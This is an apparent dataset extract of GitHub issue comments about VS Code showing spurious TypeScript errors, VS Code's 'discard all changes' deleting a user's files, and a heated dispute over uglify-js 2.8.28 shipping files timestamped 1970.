Info 155  [17:10:52.366] DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 156  [17:10:52.544] Elapsed:: 178ms DirectoryWatcher:: Triggered with C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/.staging :: WatchInfo: C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules 1 Project: /dev/null/inferredProject1* WatchType: Directory of Failed lookup locations in module resolution
Info 157  [17:10:53.106] Received response:
    {""projectName"":""/dev/null/inferredProject1*"",""typeAcquisition"":{""enable"":true,""include"":[],""exclude"":[]},""compilerOptions"":{""module"":1,""target"":3,""jsx"":1,""allowJs"":true,""allowSyntheticDefaultImports"":true,""allowNonTsExtensions"":true,""noEmitForJsFiles"":true,""maxNodeModuleJsDepth"":2},""typings"":[""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/eslint/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/gulp/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/gulp-autoprefixer/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/gulp-concat/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/gulp-minify-css/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/gulp-plumber/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/gulp-sass/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/gulp-sourcemaps/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/gulp-uglify/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/handlebars/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/async/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/js-base64/index.d.ts"",""C:/Users/username/AppData/Local/Microsoft/TypeScript/3.0/node_modules/@types/sprintf/index.d.ts""],""unresolvedImports"":[],""kind"":""action::set""}
```

**gulpfile.js:**

```
var gulp = require('gulp');
var uglify = require('gulp-uglify');
var livereload = require('gulp-livereload');
var concat = require('gulp-concat');
var minifyCss = require('gulp-minify-css');
var autoprefixer = require('gulp-autoprefixer');
var plumber = require('gulp-plumber');
var sourcemaps = require('gulp-sourcemaps');
var sass = require('gulp-sass');

//Handlebars plugins
var handlebars = require('gulp-handlebars');
var handlebarsLib = require('handlebars');
var declare = require('gulp-declare');
var wrap = require('gulp-wrap');

// File paths
var DIST_PATH = 'public/dist';
var SCRIPTS_PATH = 'public/scripts/**/*.js';

// SCSS Styles
gulp.task('styles', function(){
    console.log('Starting styles task');

    return gulp.src('public/scss/styles.scss')
    .pipe(plumber(function(error){
        console.log('Styles task error');
        console.log(error);
        this.emit('end');
    }))
    .pipe(sourcemaps.init())
    .pipe(autoprefixer())
    .pipe(sass({
        outputStyle: 'compressed'
    }))
    .pipe(sourcemaps.write())
    .pipe(gulp.dest(DIST_PATH))
    .pipe(livereload());
});

// Scripts
gulp.task('scripts', function(){
    console.log('Starting scripts task');

    return gulp.src(SCRIPTS_PATH)
        .pipe(plumber(function(error){
            console.log('Scripts task error\n' + error);
            this.emit('end');
        }))
        .pipe(sourcemaps.init())
        .pipe(babel({
            presets: ['es2015']
        }))
        .pipe(uglify())
        .pipe(concat('scripts.js'))
        .pipe(sourcemaps.write())
        .pipe(gulp.dest(DIST_PATH))
        .pipe(livereload());
});

// Images
gulp.task('images', function(){
    console.log('Starting images task');
});

// Watch
gulp.task('watch', function(){
    console.log('Starting watch task');
    require('./server.js');
    livereload.listen();
    gulp.watch(SCRIPTS_PATH, ['scripts']);
    // gulp.watch(CSS_PATH, ['styles']);
    gulp.watch('public/scss/**/*.scss', ['styles']);
});

// Default
gulp.task('default', function(){
    console.log('Starting default task');
});
```"
3728	"The hint to disable ""TypeScript and JavaScript Language Features"" extension did help in may case as well, but the hint itself is next to something like ""To avoid such errors just stop using VS Code and switch to another editor"". No go, sorry.

And I don't understand why is this issue not the one of high priority ones still. It's ruining VS Code  experience completely. Imagine if in PHP files it would pop Symphony or Laravel errors without having latter ones even installed. Nonsense!"
3729	"While disabling the ""TypeScript and JavaScript Language Features"" extension resolved the issue, upgrading to VSCode 1.27.2 also seems to do the trick."
3730	"> While disabling the ""TypeScript and JavaScript Language Features"" extension resolved the issue, upgrading to VSCode 1.27.2 also seems to do the trick.

Nope, 1.27.2 has nothing to do with that. Only disabling the extension helps."
3731	"After upgrading to 1.27.2 and enabling ""TypeScript and JavaScript Language Features"", I no longer get [ts] errors when using optional chaining, ie
```
const name = bob?.name;
```

@illusive-man What error are you getting? Can you provide an example of some code that is giving you the error? You have upgraded to 1.27.2, correct (you can check your version by going to `Help` -> `About`)?

Edit: In 1.27.2 (With ""TypeScript and JavaScript Language Features"" enabled) I am unable to replicate the error you get from `export default from './Wrapper';`, even when I remove `""@babel/plugin-proposal-export-default-from""` and `""@babel/plugin-proposal-export-namespace-from""` from my .babelrc. I also tried enabling `""typescript.validate.enable""` and `""javascript.validate.enable""` in my user settings and I didn't receive an error."
3732	"@JourdanClark @illusive-man @david-middleton-at-resolver ,
Look at my comment above. I am on version 1.27.2 and I am still getting errors with this code:

![image](https://user-images.githubusercontent.com/3253360/45770651-d5052300-bbf7-11e8-8efa-ac948dbe57fc.png)
"
3733	"@JourdanClark, please, mate - don't tell me how to check software version. It's kinda stupid. If I told you that in 1.27.2 I still have that [ts] error it means that (surprise!) in 1.27.2 I still have that [ts] error. :)

![ts_errorjpg](https://user-images.githubusercontent.com/25516639/45774391-7373a180-bc55-11e8-8d30-0526b41a80de.jpg)

@Jikodis, no need to tell that to me, I'm in the same boat! )"
3734	"User.test.js:
```javascript
import mongoose from 'mongoose';
import User from '../../../server/models/User';

require('dotenv').config();

const { MONGO_URL_TEST } = process.env;

describe('slugify', () => {
  beforeAll(() = {
    mongoose.connect(MONGO_URL_TEST);
  });
  test('no duplication', () => {
    expect.assertions(1);
    return User.remove()
      .then(() => User.signInOrSignUp({
        googleId: 'test1',
        email: 'test1@test.ts',
        googleToken: { accessToken: 'test1', refreshToken: 'test1' },
        displayName: 'Test Name',
        avatarUrl: 'test1',
      }))
      .then((user) => {
        // console.log('user created', user);
        expect(user.slug).toBe('test-name');
      });
  });
});
```
typo in `beforeAll(() = //missed '>' here` cause 1 valid [eslint] error, but also 3 unexpected [ts] errors further in the code.
VSCode 1.27.2
DotENV 1.0.1
ESLint 1.6.0
Prettier - Code Formatter 1.6.1"
3735	"I'm on VSC 1.28.1 (macOS 10.13.6). 
I never installed any TS-related extensions.
Grateful to @JourdanClark for the tip:    
 
  > ""... Extension view, search for @builtin javascript, and disable TypeScript and JavaScript Language Features.""  

which finally resolved the nonsensical TS linting suggestions from my es6 projects. "
3736	`var export = something` gives me `export= can only be used in a .ts file.` as an error in vanilla js. Only js validation is enabled in my settings, and i still get ts errors.
3737	"Tiny question: Are you interested in solving your problem? I didn't had experienced this after using this for over a year now... 
> I clicked discard...

But this looks like a valid operation, so, you need to watch out before you press buttons. Maybe you can pull latest changes from your SVN?"
3738	"@jens1o I hadn't commited any of them to any repository. But that shouldn't mean that this thing is going to toss your files to oblivion because of that decision. It didn't say CAUTION: THIS WILL DELETE EVERY FILE FROM THIS FOLDER IN YOUR COMPUTER. It said: are sure to discard all the changes? which isn't similar to what it does by any means. Why on earth wouldn't you just move the files to the trash bin? 

Now I am just supposed to suck it up and start over from scratch right?  "
3739	It damaged so much of my codebase, deleted so much dependencies too that I don't even know where to start fixing it. I am basically condemned to start over again. This is ABYSMAL design. 
3740	I am still in disbelief. 
3741	"https://social.msdn.microsoft.com/Forums/expression/en-US/b32e47a9-d86c-473a-9449-a7f5c202463c/visual-studio-code-just-deleted-all-my-files?forum=visualstudiogeneral

I am not the only one who this editor has fucked over. This option is just malicious and if you have a modicum of decency and morality as developers, at least move the files to recycle bin so that this doesn't happen to people wanting to try your products. 

This is absolutely awful and I don't take back any word of contempt against whoever designed this heinous and abhorrent behavior. "
3742	"Even since I lost a big school project around 15 years ago I use source control, always, everywhere. Even my game saves are source controlled. On top of that, My main drives are externally backed up every day.

Why you have three months of work not under source control is the bigger question."
3743	"In git client, ""Discard All Changes"" usually means `git checkout`. It's in the specifications in git."
3744	@remcoros yeah, so the damage done by the destructive bug in the code is now my fault for not being a clairvoyant and seeing this piece of shit software was going to fuck up my files. I don't need to explain  why I don't have a private repo with my stuff. It is the software's  concern NOT to destroy the integrity of a computer like a damn virus. You come here, see my despair and berate me for something that was not my fault, and has happened to a lot of other people? Fuck you. 
3745	"@eliecerthoms We're sorry you've hit this. We really are.

But let me address some of your feedback first:

> It didn't say CAUTION: THIS WILL DELETE EVERY FILE FROM THIS FOLDER IN YOUR COMPUTER. It said: are sure to discard all the changes? which isn't similar to what it does by any means.

Actually this is what you've seen:

![img](https://user-images.githubusercontent.com/240625/29264526-c8a1b354-80dd-11e7-82d7-76e7b0066998.png)

It seems that we weren't that way off.

---

Now let me ask you something else: what would you think would happen if you used any other application which integrates Git? Let me try to guess. You'd probably initialize a repository as well, just because why not? It's not like you're messing with code which doesn't have backups right? You'd probably see all those changes appear and try to find a way to make them disappear, just like what happened here. You'd also probably avoid attempting to understand a bit more about what you're messing with, similarly to this situation. As you finally find that magic action which will solve all your problems, the application would still delete your files, no matter how many confirmation dialogs it would pop up attempting to tell you this is dangerous.

This happened with Code. It could have happened with Atom, Git Tortoise, Git Kraken. These are all powerful tools and with more power comes more responsibility. When you sell hammers you'll likely have people using them to hit their own heads, which, understandably, they will put the hammer at fault. Now, we already put a big _don't hit this on your own head_ label on our hammer. Should we actually prohibit people from head hitting with our hammers? Probably not, since some users still want to hit heads with it. It's just how hammers work.

---

Now, #32459 was started by @thierer with an attempt to prevent situations like this. Let's make that happen."
3746	🤣 
3747	"I'd say remove the warning dialog, and prompt an ""Undo"" that lasts 5 seconds. Behind the scenes count to 5 and then do it. People respond much better to ""Undo"" than they do to ""Are you sure?"" dialog. Hide the files so that way they know what they did and the consequences that are about to happen. "
3748	Isn't there a local history to get everything back? Using PHP and PhpStorm as my IDE, I can simply undo this action as it's in my local history. 
3749	this is hilarious
3750	"I'm afraid not much can be done over here - may be try asking `npm` about this?

https://github.com/npm/npm/issues"
3751	One thing I can add is `uglify-js 3.0.15` was published with `npm` that was bundled with `node 7.10.0`, whereas IIRC `uglify-js 2.8.28` was done with `node 8.0.0` - so you may add that to your issue report for them.
3752	"Pretty sure the issue is on your side.  2.8.27 is fine as well.  It's only 2.8.28 that is ""corrupted."""
3753	Unless the package is unusable, I wouldn't be too bothered by it. And there is no way I can influence the behaviour of `npm publish`, so your best course of action is to ask them about this.
3754	"The package is not usable.  I cannot zip up the build folder because zip cannot handle files with a creation date before 1980.

I had to switch to 2.8.27.  Can you not just republish 2.8.28 to fix these timestamps?"
3755	"`npm` does not allow re-publishing the same version. Why does using `uglify-js` involves creating a zip file anyway? I'm under the impression that it's `npm install uglify-js` followed by `require(""uglify-js"")` in your code somewhere?"
3756	"So that I can create a package for deploying the application along with npm dependencies to a test environment.

Edit: can you try pushing a new version, 2.8.29?  "
3757	"And even if I were to publish `2.8.29` which is identical to `2.8.28`, what guarantees `npm` would produce the correct result this time?

As advised above, please contact `npm` to make sure the issue is diagnosed/resolved first."
3758	I can almost guarantee that if I open a ticket with npm and/or nodejs about a specific npm module on a specific version having corrupted timestamps they're going to point the finger back at this module.
3759	"I just downloaded your tgz file DIRECTLY from npm, and it's corrupted IN the tgz file:
```
[etucker: npm_test]$ npm view uglify-js@2.8.28 | tail -n 10
  optionalDependencies: { 'uglify-to-browserify': '~1.0.0' },
  browserify: { transform: [ 'uglify-to-browserify' ] },
  scripts: { test: 'node test/run-tests.js' },
  gitHead: '23876a84a51835ca791afa12931e747df048178f',
  dist: 
   { integrity: 'sha512-WqKNbmNJKzIdIEQu/U2ytgGBbhCy2PVks94GoetczOAJ/zCgVu2CuO7gguI5KPFGPtUtI1dmPQl6h0D4cPzypA==',
     shasum: 'e335032df9bb20dcb918f164589d5af47f38834a',
     tarball: 'https://registry.npmjs.org/uglify-js/-/uglify-js-2.8.28.tgz' },
  directories: {} }

[etucker: npm_test]$ wget https://registry.npmjs.org/uglify-js/-/uglify-js-2.8.28.tgz
--2017-06-05 13:59:16--  https://registry.npmjs.org/uglify-js/-/uglify-js-2.8.28.tgz
Resolving registry.npmjs.org (registry.npmjs.org)... 151.101.0.162, 151.101.64.162, 151.101.128.162, ...
Connecting to registry.npmjs.org (registry.npmjs.org)|151.101.0.162|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 129468 (126K) [application/octet-stream]
Saving to: ‘uglify-js-2.8.28.tgz’

uglify-js-2.8.28.tgz                      100%[==================================================================================>] 126.43K  --.-KB/s    in 0.07s   

2017-06-05 13:59:16 (1.69 MB/s) - ‘uglify-js-2.8.28.tgz’ saved [129468/129468]

[etucker: npm_test]$ tar xf uglify-js-2.8.28.tgz 
[etucker: npm_test]$ ll
total 132
drwxrwxr-x 5 etucker etucker   4096 Jun  5 13:59 package
-rw-rw-r-- 1 etucker etucker 129468 Jun  3 10:54 uglify-js-2.8.28.tgz
[etucker: npm_test]$ ll package
total 64
drwxrwxr-x 2 etucker etucker  4096 Jun  5 13:59 bin
drwxrwxr-x 2 etucker etucker  4096 Jun  5 13:59 lib
-rw-rw-r-- 1 etucker etucker  1348 Dec 31  1969 LICENSE
-rw-rw-r-- 1 etucker etucker  1139 Dec 31  1969 package.json
-rw-rw-r-- 1 etucker etucker 41915 Dec 31  1969 README.md
drwxrwxr-x 2 etucker etucker  4096 Jun  5 13:59 tools
[etucker: npm_test]$ 
```"
3760	Regardless of who is to blame here, you have to resolve this somehow.  You have a corrupted tarball on the latest 2.x version available.  It's not my responsibility to figure out why your publish corrupted the timestamps on these files.
3761	Why is this issue closed? The package you published to npm has corrupt file metadata. There are developers here at The Atlantic who have lost a whole afternoon of work trying to debug an issue caused by 2.8.28.
3762	@alexlamsl `npm publish` will package up whatever files you have locally. That would have been where the problem was introduced, in the directory on your filesystem where you did the `npm publish`. If you were to publish 2.8.29 from a fresh clone of the repository I'm sure there would be no issue with the files.
3763	"> There are developers here at The Atlantic who have lost a whole afternoon of work trying to debug an issue caused by 2.8.28.

What issue?
```
$ node_modules/.bin/uglifyjs -V
uglify-js 2.8.28

$ echo 'console.log(1 + 2);' | node_modules/.bin/uglifyjs -c
console.log(3);
```
2.8.28 still functions correctly regardless of the bad timestamps produced by `npm publish` with node 8/npm 5."
3764	It caused errors with the filesystem in our dockerized development environment. Of course it still functions as it's supposed to, provided the package can actually be installed.
3765	"> It caused errors with the filesystem in our dockerized development environment. Of course it still functions as it's supposed to, provided the package can actually be installed.

The next 2.x release can be made with a non-`npm@5` version of `npm`, but the issue you're describing concerns the docker project or is a bug with `npm` on the docker filesystem."
3766	"Same issue here. Our private deployment system reject the tarball.

If I extract the tarball and `stat package/README.md` for instance, I get an incorrect/strange date : 

```
16777220 33434588 -rw-r--r-- 1 francetv wheel 0 41915 ""Jun  6 16:03:41 2017"" ""Jan  1 01:00:00 1970"" ""Jun  6 16:03:41 2017"" ""Jan  1 01:00:00 1970"" 4096 88 0 package/README.md
```"
3767	@alexlamsl please stop trying to defer blame here.  The issue is with this specific npm package for a specific version.  Push a new version so people can move on.
3768	"`tar tvf uglify-js-2.8.28.tar` gives : 

```
-rw-rw-rw-  0 0      0        1139  1 jan  1970 package/package.json
-rw-rw-rw-  0 0      0       41915  1 jan  1970 package/README.md
-rw-rw-rw-  0 0      0        1348  1 jan  1970 package/LICENSE
-rw-rw-rw-  0 0      0        1982  1 jan  1970 package/bin/extract-props.js
-rw-rw-rw-  0 0      0       21426  1 jan  1970 package/bin/uglifyjs
-rw-rw-rw-  0 0      0       11096  1 jan  1970 package/lib/utils.js
...
```

Should I post a `tar` issue ?"
3769	"This is blocking my deployments also...

Any workaround?"
3770	@mishagray use 2.8.27 until the module author decides that this isn't a problem with node / npm.
3771	This seems related to https://github.com/npm/npm/issues/10052, which (if resolved) would alleviate your issue.
3772	"It's true that npm/npm#10052 would incidentally fix this issue, because it would reset modification times on files, but there is a much simpler fix that would not require waiting for an 18-month-old issue on npm to be fixed. *Make a _fresh_ clone of the repository, bump the version, and publish to npm.* I am certain that whatever condition caused the initially packaged files to have corrupted metadata will not be reproduced and the problem will be solved. It doesn't matter what version of npm you use to publish because *it is not a bug in npm.*

This is a bug in the package you pushed to the npm registry, @alexlamsl, plain and simple. Your refusal to acknowledge this or to take even the simplest steps to address it reflects very poorly on you and on this project."
3773	@fdintino This is not a bug in UglifyJS.
3774	"Who cares what the cause of the issue is?  Fix it first then point fingers after. This attitude of ""not my problem"" when your package is broken solves nothing."
3775	"I'm baffled by your attitude, frankly. An immeasurable amount of time has been put into this project by people in their own spare time, and you expect them to fix *your* environment for you?

UglifyJS is not broken.

(And to be honest, it is exactly this attitude that drives me away from doing OSS at all)"
3776	Fix MY Environment?  Wtf are you talking about?  It's been demonstrated that the tarball on npm has corrupted timestamp data. How is that MY environment?
3777	"> I'm baffled by your attitude, frankly.

Then the bafflement is mutual. You have four different people telling you that the file metadata in the 2.8.28 package is causing issues with their environments and deployments. And you have a (likely) easy solution—push a bumped version from a directory other than the corrupted one that published 2.8.28. But you ignore the former and don't seem to care about the latter. It goes without saying that everyone here appreciates the hard work that is poured into this project, otherwise we wouldn't be using it! I maintain several popular open source projects as well, and I appreciate the challenges that come with it. But if a package I published caused issues in multiple peoples environments, and it was in my power to fix it, I would do so!

I think it's safe to assume that the odd modification time of the files in uglify-js is not intentional—it has no functional benefit and it's also plainly incorrect, these files were not modified in 1969. You have multiple people telling you that this causes incompatibilities in various different systems.

I can only speak for myself, but here's a demonstration of how the files are incompatible in our system. To reproduce, you just need to install [unison](https://github.com/bcpierce00/unison), a tool for performing two-way directory syncing:

```
mkdir /tmp/{a,b}
cd /tmp/a
npm init -y
npm install --save uglify-js@2.8.28
cd ..
unison a/ b/ -auto -batch -times -prefer newer || echo ""EXITED WITH ERROR CODE $?""
```

Outputs the following:

```
Contacting server...
Looking for changes
Reconciling changes
new dir  ---->            node_modules
new file ---->            package.json
Propagating updates

UNISON 2.48.4 started propagating changes at 17:48:06.09 on 06 Jun 2017

[BGN] Copying node_modules from /tmp/test/a to /tmp/test/b

Failed: Failed to set modification time of file
/tmp/test/b/.unison.node_modules.08b6882f.unison.tmp/uglify-js/bin/extract-props.js
to 1969-12-31 at 19:00:00 (0.000000): the time was set to 2017-06-06 at 17:48:06
(1496785686.000000) instead

99%  00:00 ETA

Failed [node_modules]: Failed to set modification time of file
/tmp/test/b/.unison.node_modules.08b6882f.unison.tmp/uglify-js/bin/extract-props.js
to 1969-12-31 at 19:00:00 (0.000000): the time was set to 2017-06-06 at 17:48:06
(1496785686.000000) instead

[BGN] Copying package.json from /tmp/test/a to /tmp/test/b
[END] Copying package.json
UNISON 2.48.4 finished propagating changes at 17:48:06.12 on 06 Jun 2017
Saving synchronizer state
Synchronization incomplete at 17:48:06  (1 item transferred, 0 skipped, 1 failed)
  failed: node_modules
EXITED WITH ERROR CODE 2
```

Is it a bug that unison cannot sync files with a ctime and mtime of 0? Yes, perhaps, and I can open a ticket on that project. But judging by the others who have posted on this issue, the file metadata in the npm tgz are causing problems in other systems. And there is an easy way to ensure compatibility with everyone's system—a clean build and publish of a new version. I apologize for my tone earlier in this thread—I'm just frustrated by the refusal to even _try_ to help."
3778	"> Fix MY Environment? Wtf are you talking about? It's been demonstrated that the tarball on npm has corrupted timestamp data. How is that MY environment?

@eric-tucker:  ""I cannot zip up the build folder because zip cannot handle files with a creation date before 1980.""

Even with the incorrect timestamps, `npm install uglify-js@2.8.28` works on every platform I've tried and runs correctly. 

The problem with your zip program is out of scope of uglify. It's trivial to write a command to touch the files for your broken `zip` command."
3779	"> Is it a bug that unison cannot sync files with a ctime and mtime of 0? Yes, perhaps, and I can open a ticket on that project. 

+1"
3780	Am I correct in interpreting your response to mean that you will publish a clean build of 2.8.29 to see if that resolves our issues?
3781	"@kzc are you seriously suggesting I run npm install directly on my production systems?

Wow.   "
3782	"> Am I correct in interpreting your response to mean that you will publish a clean build of 2.8.29 to see if that resolves our issues?

@fdintino The next 2.x release will be made in due course likely with something other than `npm@5`. The `+1` was for your making a unison bug report.

> are you seriously suggesting I run npm install directly on my production systems?

@eric-tucker Please read the last sentence in https://github.com/mishoo/UglifyJS2/issues/2054#issuecomment-306630225"
3783	"This is absurd.  This is no different than someone reporting a bug and you saying ""it's trivial to write a patch to apply against the code.""

The issue is not with zip. I can't even process the level of arrogance in the statement ""your broken zip command"". As if zip and every other tool out there is to blame for not handling epoch 0. 

Seriously, does it cost money to publish a new version to npm?  Why is this conversation still going on when multiple people have complained?

You're essentially saying your time (to publish a fixed package) is worth more than the time of everyone who is going to encounter this issue, spend countless combined hours debugging, find this issue, then fix their build processes to do a touch command?

How much wasted developer and operations hours will it take for you to say ""I guess we should fix the issue on our end""?
"
3784	We're also experiencing this issue and it's frustrating. uglify-js is being used way down our dependency tree so no easy way for us to force this to the previous version. Implementing a horrible hack to change the dates on the files after npm install doesn't seem viable.
3785	"@fdintino Why did you delete your comment slagging @rvanvelzen?

It is exactly that attitude that drives people away from contributing to OSS.

Uglify is as good as it is because of the efforts of volunteers like @rvanvelzen and @alexlamsl.

> Another reason to look at alternatives like rollup.

Please do. Share your sunshine with other projects."
3786	I deleted the comment because I thought better of it. It was mean-spirited and singled out a specific developer for no good reason. I had let my frustration get the better of me and for that I apologize.
3787	I also see that uglify-js has had a huge increase in new and useful features lately, largely thanks to the developers in this thread. I hadn't intended to belittle that work over what is a relatively minor issue, but despite myself I did. Sorry.
3788	Hello, please could you release a fix. This issue is by any measure a fault with the uglify-js NPM package. It's causing an unknown number of wasted hours throughout the NPM ecosystem and is breaking the deployment of many live systems. We don't use Uglify explicitly; our dependency is due to Webpack. Many thanks for your work.
3789	"Wow.  Look at all the related issues, ALL being caused by this broken npm package.

But no, please tell the rest of the world to deal with it because it's not a problem with uglify-js."
3790	"@kzc @alexlamsl @rvanvelzen is there anything we can help out with? We understand you all are under constant pressure and we are happy to lend a hand. 

CC @isaacs is there anything npm related that would cause this issue.  "
3791	"@TheLarkInn thanks for the offer. My plan is to try and reproduce this in the first place, so I can figure out what to do next.

Having said that, this is not on top of my list right now, and eventually when the next backport comes along before any definite conclusions, I'd just use Node.js Carbon for `npm publish` :crossed_fingers: "
3792	🤞🤞 understandable let us know if there's anything we can do to help. If there's busy work or higher priority stuff we can help free up for you to prioritize we are happy to do so. Good luck!
3793	"Not at the top of your list?  Look how many projects are affected by this!  Consider how many are affected that have not complained. 

What on earth are you doing that's higher priority that this issue breaking potentially thousands of builds across the planet?

It would take two minutes to publish a new version. This is mind boggling. "
3794	@alexlamsl could you at least re-open the issue? Having the issue closed is potentially confusing for people who are searching google or github for this problem. It would also help avoid more people opening duplicate tickets.
3795	So we're just not going to fix this huh?  We're going to leave the entire world broken and having to implement work-arounds in their build process?
3796	@eric-tucker Still trying to hack in a workaround into ours this morning :/ 
3797	Hey @dazulu and guys, [this](https://github.com/aws/aws-cli/issues/2639#issuecomment-307218133) worked to me.
3798	@felipekm thanks for that.  I pointed out in this thread that Uglify-JS must be locked at 2.8.27 until the maintainers decide to fix this extremely wide spread issue that apparently isn't top priority.
3799	@alexlamsl at least reopen this issue.  It should not be closed.   It's a real issue affecting many projects.
3800	"This is causing an issue for us with CircleCI & CodeDeploy. https://discuss.circleci.com/t/zip-does-not-support-timestamps-before-1980/13110/8

Also, reading this issue puts uglifyJS in a really bad light... "
3801	why is this issue closed? been trying to figure out what has been going wrong with my app all day, just now finding this, @alexlamsl can you please reopen?
3802	"I'll grant, for the sake of argument, that the broken behavior re: epoch 0 in `zip`, `unison`, and other tools is a bug. 

That means it's a really _common_ bug, in really ubiquitous utilities. In much the same way that it's risky to put unicode characters in filenames for projects that will be deployed on many different filesystems (filesystems without good normalization may choke, causing problems), it's a very risky choice to install highly unusual date metadata on files in this repository. Past a certain point, when enough of the universe of deployment targets shares a defective behavior, it's time to start thinking about working around that behavior--even if it _is_ technically ""working around someone else's bug"".

Where I think this went off the rails is with the conflict over the refusal to release an update. To be very clear: there is _incorrect_ and _likely to surface very common bugs_ data that was uploaded to NPM. This is not a problem introduced by NPM any more than an SQL injection attack is introduced by a web form: NPM is _vulnerable_ to problematic use; not _responsible_ for the problem data.

Regardless of whether NPM should, can, or will eventually correct such errors, that is obviously not happening for a lot of users.

Given that sometimes it is necessary to work around others' defective behavior, and given how simple the workaround is, I think that it's a very good idea to release a bumped version with correct file metadata."
3803	I'd say kudos to the UglifyJS contributors for standing firm and not re-opening this issue even in the face of what I would have found overwhelming pressure. Finding all these other bugs in other software can only improve things for everyone in the long run, and this really helped smoke out a lot of problems!
3804	This is just a sad state if affairs. Please push a new release or at least reopen the issue. 
3805	Folks can also vote with their feet: https://github.com/google/closure-compiler
3806	"@pink-mist I can't tell if you're being serious or sarcastic. 

If you're being serious please leave. Files aren't supposed to have time stamps prior to or equal to epoch's creation. Tools shouldn't have to deal with this. "
3807	![](https://s-media-cache-ak0.pinimg.com/originals/0d/61/c8/0d61c84be2a6e813bc3e1f0409d9a603.gif)
3808	"> I can't tell if you're being serious or sarcastic.

While I do find the situation humorous, I was being perfectly serious. This whole issue isn't something to get so worked up over though, this software works completely fine.

> Files aren't supposed to have time stamps prior to or equal to epoch's creation.

Why not? Being able to have whatever timestamp you can on your files shouldn't be dictated by some buggy software.

> Tools shouldn't have to deal with this.

Do you really think this is the first and last time this issue will ever arise? If tools can't deal with it, they should definitely be fixed."
3809	Everybody complaining here should read the [LICENSE](https://github.com/mishoo/UglifyJS2/blob/cb0c576bddced8facf514aca00023af834353298/LICENSE#L18-L29) file.
3810	"If you decide to make something that becomes a crucial dependency of many things, and then push a broken version, you don't get to fairly claim ""no warranty"" and absolve yourself of all responsibility. "
3811	"@eric-tucker: To quote the license:
```
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER “AS IS” AND ANY
EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE ARE DISCLAIMED.
```"
3812	"Great. So every issue on every open source project should be dealt with by quoting the license and saying ""when we feel like it."""
3813	That's exactly the point of giving your project a license - to make clear you have this option.
3814	"> That's exactly the point of giving your project a license - to make clear you have this option.

I think the point of a license is for legal protection. However we don't have to like what is happening here. "
3815	"> _UglifyJS is not broken._

While this isn't exactly a ""program breaking bug"", it is still an issue. If this wasn't affecting anyone, we could mark it as a weird accident and go on with our lives, but this is directly affecting people and their software. Yes, you are not legally obligated to fix it, but you must agree that ""_I don't have to_"" is a bullshit reason for not _helping someone in need_. Taking a couple minutes out of your day to deal with a quirk that could possibly be detrimental to someone and their software would be a _nice_ thing to do. Obviously this code isn't flying spaceships to Mars, but if it's fucking up @eric-tucker's code then that's one person who is relying on your software, and one person you can help.

I'm not trying to sound like an asshole, but it's difficult to sound nice when I'm criticizing you for not being nice. If there's nothing you can do, there's nothing you can do. Whipping out your license as an _excuse_ to not _help_ someone is just plain awful.

I think this comment on Reddit sums this up rather nicely:

> [asdfasdafas 16 points 3 hours ago](https://www.reddit.com/r/programming/comments/6gvfz0/how_not_to_respond_to_issues_on_github/dite3yj/)
>
> Uglify devs sound like major assholes. In the time it took to post their rants they could have fixed it and saved everyone time."
3816	"To help narrow down the issue, I have put together a reproducable case in another issue, but am moving the details here as it was closed:

**[v2.8.28's .tgz contains corrupt timestamps, causing errors from `zip` command and others](https://github.com/mishoo/UglifyJS2/issues/2065)**:

---

**Bug report or feature request?** 

Bug report

**Uglify version (`uglifyjs -V`)**

```
$ ./node_modules/.bin/uglifyjs -V
uglify-js 2.8.28
```

**Steps to reproduce**

```
$ npm init -y
$ npm install uglify-js@2.8.28
$ ls node_modules/uglify-js
total 104
-rw-r--r--   1 jess.telford  staff   1.3K  1 Jan  1970 LICENSE
-rw-r--r--   1 jess.telford  staff    41K  1 Jan  1970 README.md
...
```

Notice the Jan 1st, 1970 timestamp.

This is causing issues on certain platforms where the timestamp is actually reported as December 31st, 1969, causing POSIX tools to fail. (ie; it's a `-1` unix timestamp).

_Edit_: The actual error is: `ZIP does not support timestamps before 1980` on Ubuntu 14.04 (our build machine)

**Analysis**

It looks like it's the actual files inside the package, which implies it's not anything to do with `npm`, but instead to do with the state of the filesystem at the time of publish (I've accidentally caused bad publishes like this myself in the past):

```
$ curl https://registry.npmjs.org/uglify-js/-/uglify-js-2.8.28.tgz | tar -tvf -
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0-rw-rw-rw-  0 0      0        1139  1 Jan  1970 package/package.json
-rw-rw-rw-  0 0      0       41915  1 Jan  1970 package/README.md
-rw-rw-rw-  0 0      0        1348  1 Jan  1970 package/LICENSE
-rw-rw-rw-  0 0      0        1982  1 Jan  1970 package/bin/extract-props.js
-rw-rw-rw-  0 0      0       21426  1 Jan  1970 package/bin/uglifyjs
-rw-rw-rw-  0 0      0       11096  1 Jan  1970 package/lib/utils.js
